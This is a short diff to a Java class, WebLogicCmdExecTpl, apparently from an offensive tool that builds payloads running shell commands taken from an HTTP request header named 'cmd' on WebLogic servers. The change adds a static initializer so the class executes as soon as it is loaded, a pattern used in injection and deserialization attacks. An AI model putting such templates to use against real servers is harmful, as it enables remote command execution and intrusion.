@@ -1,5 +1,7 @@
 package jeg.core.template.weblogic;
 
+import jeg.core.template.undertow.UndertowCmdExecTpl;
+
 import java.io.InputStream;
 import java.io.PrintWriter;
 import java.lang.reflect.Field;
@@ -11,6 +13,9 @@ import java.util.Scanner;
  * test in weblogic 10.3.6.0/12.1.3.0/12.2.1.3.0
  */
 public class WebLogicCmdExecTpl {
+    static {
+        new WebLogicCmdExecTpl();
+    }
     // 传参：需要执行的命令
     private String getReqHeaderName() {
         return "cmd";
